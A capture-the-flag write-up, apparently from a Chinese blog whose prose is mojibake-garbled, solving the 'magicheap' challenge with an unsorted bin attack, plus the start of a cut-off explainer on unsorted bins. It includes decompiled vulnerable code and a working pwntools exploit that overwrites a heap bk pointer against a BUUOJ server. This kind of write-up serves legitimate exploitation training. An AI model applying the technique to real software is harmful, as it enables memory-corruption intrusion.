å­˜åœ¨åé—¨å‡½æ•°"></a>l33t å­˜åœ¨åé—¨å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">"cat /home/magicheap/flag"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a>å…¨å±€å˜é‡</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">00000000006020B</span>9                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020</span>C0                 public magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 ; __int64 magic<br>.bss:<span class="hljs-number">00000000006020</span>C0 magic           dq ?                    ; DATA XREF: main:loc_400D05â†‘r<br>.bss:<span class="hljs-number">00000000006020</span>C8                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">00000000006020E0</span>                 public heaparray<br>.bss:<span class="hljs-number">00000000006020E0</span> ; heap *heaparray[<span class="hljs-number">10</span>]<br>.bss:<span class="hljs-number">00000000006020E0</span> heaparray       dq ?                    ; DATA XREF: create_heap+<span class="hljs-number">30</span>â†‘r<br>.bss:<span class="hljs-number">00000000006020E0</span>                                         ; create_heap+<span class="hljs-number">8</span>Câ†‘w ...<br></code></pre></td></tr></tbody></table></figure><p>magic ï¼š00000000006020C0</p><p>heap_ptr ï¼š00000000006020E0</p><h3 id="meauå‡½æ•°"><a href="#meauå‡½æ•°" class="headerlink" title="meauå‡½æ•°"></a>meauå‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>æ‰“å°èœå•</p><h3 id="createå‡½æ•°"><a href="#createå‡½æ•°" class="headerlink" title="createå‡½æ•°"></a>createå‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  {<br>    <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>    {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (heap *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( !heaparray[i] )<br>      {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>è¾“å…¥å¤§å°ï¼Œåˆ›å»ºç›¸åº”å¤§å°çš„å †</p><h3 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">size_t</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>    v2 = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[v1], v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure><p>é‡æ–°è¾“å…¥å¤§å°ï¼Œæ›´æ–°å†…å®¹ï¼Œå¤§å°ç”±æˆ‘ä»¬å®šï¼Œå­˜åœ¨å †æº¢å‡ºå“¦ï¼ï¼ï¼</p><h3 id="deleteå‡½æ•°"><a href="#deleteå‡½æ•°" class="headerlink" title="deleteå‡½æ•°"></a>deleteå‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0xA</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> ( heaparray[v1] )<br>  {<br>    <span class="hljs-built_in">free</span>(heaparray[v1]);<br>    heaparray[v1] = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>}<br></code></pre></td></tr></tbody></table></figure><p>æ­£å¸¸freeæ“ä½œï¼ŒæŒ‡é’ˆæ¸…0ï¼Œä¸å­˜åœ¨uaf</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./magicheap'</span>)<br>p = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">29691</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">":"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>heap_ptr = <span class="hljs-number">0x6020E0</span><br>magic = <span class="hljs-number">0x6020C0</span><br>goal = magic - <span class="hljs-number">0x10</span><br><br><span class="hljs-comment"># ç”³è¯·ä¸€ä¸ªsmall chunk</span><br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)<br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">8</span>)   <span class="hljs-comment">#chunk0</span><br><span class="hljs-comment"># ç”³è¯·ä¸€ä¸ªchunk1é˜² chunk0 åˆå¹¶</span><br>create(<span class="hljs-number">500</span>,<span class="hljs-string">'c'</span>*<span class="hljs-number">8</span>)<br><span class="hljs-comment">#debug()</span><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x421</span>) + p64(<span class="hljs-number">0</span>) + p64(goal)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x410</span>,<span class="hljs-string">"666"</span>)<br><span class="hljs-comment">#debug()</span><br>p.sendline(<span class="hljs-string">"4869"</span>)<br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure><h3 id="åˆ›å»ºä¸¤ä¸ªchunk"><a href="#åˆ›å»ºä¸¤ä¸ªchunk" class="headerlink" title="åˆ›å»ºä¸¤ä¸ªchunk"></a>åˆ›å»ºä¸¤ä¸ªchunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><span class="hljs-comment">//chunk0</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span> <br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><span class="hljs-comment">//chunk1</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x6262626262626262</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><p>ç”³è¯·çš„ chunk(500) ä»¥é˜²æ­¢åˆå¹¶</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65440</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000201</span><span class="hljs-comment">//chunk3</span><br><span class="hljs-number">0x1a65450</span>:<span class="hljs-number">0x6363636363636363</span><span class="hljs-number">0x000000000000000a</span><br></code></pre></td></tr></tbody></table></figure><h3 id="freeæ‰small-chunkï¼Œè¢«æ”¾å…¥åˆ°-unsorted-bin-ä¸­"><a href="#freeæ‰small-chunkï¼Œè¢«æ”¾å…¥åˆ°-unsorted-bin-ä¸­" class="headerlink" title="freeæ‰small chunkï¼Œè¢«æ”¾å…¥åˆ° unsorted bin ä¸­"></a>freeæ‰small chunkï¼Œè¢«æ”¾å…¥åˆ° unsorted bin ä¸­</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x6161616161616161</span><span class="hljs-number">0x000000000000000a</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x00007f9bd595bb78</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsortedbin<br>all: <span class="hljs-number">0x1a65020</span> â€”â–¸ <span class="hljs-number">0x7f9bd595bb78</span> (main_arena+<span class="hljs-number">88</span>) â—‚â€” <span class="hljs-number">0x1a65020</span><br></code></pre></td></tr></tbody></table></figure><p>è¢«æ”¾å…¥unsorted bin ä¸­</p><p>è§‚å¯Ÿå…¨å±€å˜é‡</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020e0</span> &lt;heaparray&gt;:<span class="hljs-number">0x0000000001a65010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk1å·²ç»è¢«<span class="hljs-built_in">free</span>æ‰<br><span class="hljs-number">0x6020f0</span> &lt;heaparray+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000001a65450</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h3 id="æº¢å‡ºåˆ°ç›®çš„ä½ç½®"><a href="#æº¢å‡ºåˆ°ç›®çš„ä½ç½®" class="headerlink" title="æº¢å‡ºåˆ°ç›®çš„ä½ç½®"></a>æº¢å‡ºåˆ°ç›®çš„ä½ç½®</h3><p>é€šè¿‡å¯¹chunk 0 è¿›è¡Œæº¢å‡º ä¿®æ”¹ chunk1 çš„ bk æŒ‡é’ˆï¼Œåˆ°magic-0x10çš„ä½ç½®</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x1a65000</span><br><span class="hljs-number">0x1a65000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span><br><span class="hljs-number">0x1a65010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x1a65020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000421</span><br><span class="hljs-number">0x1a65030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00000000006020b0</span> <span class="hljs-comment">// bk -&gt; magic - 0x10</span><br></code></pre></td></tr></tbody></table></figure><h3 id="å†ç”³è¯·ä¸€ä¸ª-å¤§å°å¤§äº-small-chunk-ä¸”-å°ä¸åˆšåˆš-é‡Šæ”¾çš„chunk-çš„å¤§å°çš„-chunk"><a href="#å†ç”³è¯·ä¸€ä¸ª-å¤§å°å¤§äº-small-chunk-ä¸”-å°ä¸åˆšåˆš-é‡Šæ”¾çš„chunk-çš„å¤§å°çš„-chunk" class="headerlink" title="å†ç”³è¯·ä¸€ä¸ª å¤§å°å¤§äº small chunk ä¸” å°ä¸åˆšåˆš é‡Šæ”¾çš„chunk çš„å¤§å°çš„ chunk"></a>å†ç”³è¯·ä¸€ä¸ª å¤§å°å¤§äº small chunk ä¸” å°ä¸åˆšåˆš é‡Šæ”¾çš„chunk çš„å¤§å°çš„ chunk</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x6020b0</span> &lt;<span class="hljs-built_in">stdin</span>@@GLIBC_2<span class="hljs-number">.2</span><span class="hljs-number">.5</span>&gt;:<span class="hljs-number">0x00007f9bd595b8e0</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span> &lt;magic&gt;:<span class="hljs-number">0x00007f9bd595bb78</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>å¯ä»¥çœ‹åˆ°magic å·²ç»è¢«æ”¹æˆäº†0x00007f9bd595bb78ï¼Œè¿™ä¸ªå€¼æ˜¯main_arena+88</p><p>æœ€åæˆ‘ä»¬è¾“å…¥ 4869 å°±å¯ä»¥æ‰“å°flag äº†</p><p>flag{unsorted_bin_attack}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;unsortedbin-attackï¼ˆä¾‹é¢˜ï¼‰&quot;&gt;&lt;a href=&quot;#unsortedbin-attackï¼ˆä¾‹é¢˜ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;unsortedbin_attackï¼ˆä¾‹é¢˜ï¼‰&quot;&gt;&lt;/a&gt;&lt;strong&gt;unsortedbin_</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>unsorted bin</title>
    <link href="https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/"/>
    <id>https://kylinxin.github.io/2023/09/14/unsorted%20bin%20attack/</id>
    <published>2023-09-14T01:58:29.000Z</published>
    <updated>2023-09-13T12:59:08.891Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å…³äºunsorted-bin-å’Œ-unsorted-bin-attack"><a href="#å…³äºunsorted-bin-å’Œ-unsorted-bin-attack" class="headerlink" title="å…³äºunsorted bin å’Œ unsorted bin attack"></a><strong>å…³äºunsorted bin å’Œ unsorted bin attack</strong></h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>unsorted bin attackä½œä¸ºä¸€ç§ä¹…è¿œçš„æ”»å‡»æ–¹å¼å¸¸å¸¸ä½œä¸ºå…¶ä»–æ”»å‡»æ–¹å¼çš„è¾…åŠ©æ‰‹æ®µï¼Œæ¯”å¦‚<strong>ä¿®æ”¹global_max_fastä¸ºä¸€ä¸ªè¾ƒå¤§çš„å€¼ä½¿å¾—å‡ ä¹æ‰€æœ‰å¤§å°çš„chunkéƒ½ç”¨fast binçš„ç®¡ç†æ–¹å¼è¿›è¡Œåˆ†é…å’Œé‡Šæ”¾</strong>ï¼Œåˆæˆ–è€…<strong>ä¿®æ”¹_IO_list_allæ¥ä¼ªé€ _IO_FILEè¿›è¡Œæ”»å‡»</strong>ã€‚åœ¨ä¸Šè¿°æ”»å‡»çš„åˆ©ç”¨è¿‡ç¨‹ä¸­æˆ‘ä»¬å®é™…ä¸Šå¹¶ä¸éœ€è¦å¯¹unsorted binçš„åˆ†é…è¿‡ç¨‹æœ‰å¤ªå¤šçš„äº†è§£ã€‚</p><blockquote><p>global_max_fastæ˜¯main_arenaä¸­æ§åˆ¶æœ€å¤§fastbinå¤§å°çš„å˜é‡ã€‚</p></blockquote><h2 id="unsotedbin-åŸºæœ¬æ¥æº"><a href="#unsotedbin-åŸºæœ¬æ¥æº" class="headerlink" title="unsotedbin åŸºæœ¬æ¥æº"></a><strong>unsotedbin åŸºæœ¬æ¥æº</strong></h2><p>1ã€å½“ä¸€ä¸ªè¾ƒå¤§çš„ï¼ˆåœ¨binä¸­çš„ï¼‰chunkï¼ˆç”±äºmallocï¼‰è¢«åˆ†å‰²æˆä¸¤åŠä¹‹åï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº<strong>MINSIZE</strong>ï¼Œå°±ä¼šè¢«æ”¾åˆ°unsortedbinä¸­ã€‚</p><blockquote><p>ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœ‰ä¸ª0x90å¤§å°çš„ small chunkï¼Œæ­¤æ—¶malloc(0x60)ï¼Œå‰©ä¸‹çš„0x30ç”±äºå¤§äº MINSIZE ï¼Œä¼šè¢«æ”¾å…¥unsortedbin ä¸­</p></blockquote><p>2ã€é‡Šæ”¾ä¸€ä¸ªä¸å±äºfastbinçš„chunkï¼Œå¹¶ä¸”è¯¥chunkä¸å’Œtop_chunkç´§é‚»æ—¶ï¼Œè¯¥chunkä¼šé¦–å…ˆè¢«æ”¾åˆ°unsortedbinä¸­ã€‚<br>3ã€å½“è¿›è¡Œmalloc_consolidateæ—¶ï¼Œå¦‚æœä¸æ˜¯å’Œtop_chunkè¿‘é‚»çš„è¯ï¼Œå¯èƒ½ä¼šæŠŠåˆå¹¶åçš„chunkæ”¾åˆ°unsortedbinä¸­ã€‚</p><blockquote><p>consolidateæ˜¯ä¸€ä¸ªåŠ¨è¯ï¼Œå…¶ä¸­æ–‡æ„æ€ä¸ºï¼šä½¿åŠ å¼º; ä½¿å·©å›º; (ä½¿) ç»“æˆä¸€ä½“ï¼Œ<strong>åˆå¹¶</strong>;<br>å› æ­¤malloc_consolidateçš„æ„æ€æ˜¯å †ä¸­çš„ç¢ç‰‡æ•´ç†ï¼Œç›®çš„æ˜¯ä¸ºäº†å‡å°‘å †ä¸­çš„ç¢ç‰‡ã€‚</p></blockquote><h2 id="unsortedbin-attack-æ¦‚è¿°"><a href="#unsortedbin-attack-æ¦‚è¿°" class="headerlink" title="unsortedbin_attack æ¦‚è¿°"></a>unsortedbin_attack æ¦‚è¿°</h2><p>â— Unsorted Bin Attackï¼Œé¡¾åæ€ä¹‰ï¼Œè¯¥æ”»å‡»ä¸ Glibc å †ç®¡ç†ä¸­çš„çš„ Unsorted Bin çš„æœºåˆ¶ç´§å¯†ç›¸å…³ã€‚<br>â— Unsorted Bin Attack è¢«åˆ©ç”¨çš„å‰ææ˜¯æ§åˆ¶ Unsorted Bin Chunk çš„ <strong>bk</strong> <strong>æŒ‡é’ˆ</strong>ã€‚</p><h2 id="unsortedbin-attack-æ•ˆæœ"><a href="#unsortedbin-attack-æ•ˆæœ" class="headerlink" title="unsortedbin_attack æ•ˆæœ"></a>unsortedbin_attack æ•ˆæœ</h2><p>â— <strong>Unsorted Bin Attack å¯ä»¥è¾¾åˆ°çš„æ•ˆæœæ˜¯å®ç°ä¿®æ”¹ä»»æ„åœ°å€å€¼ä¸ºä¸€ä¸ªè¾ƒå¤§çš„æ•°å€¼ï¼Œç„¶åé…åˆfastbin 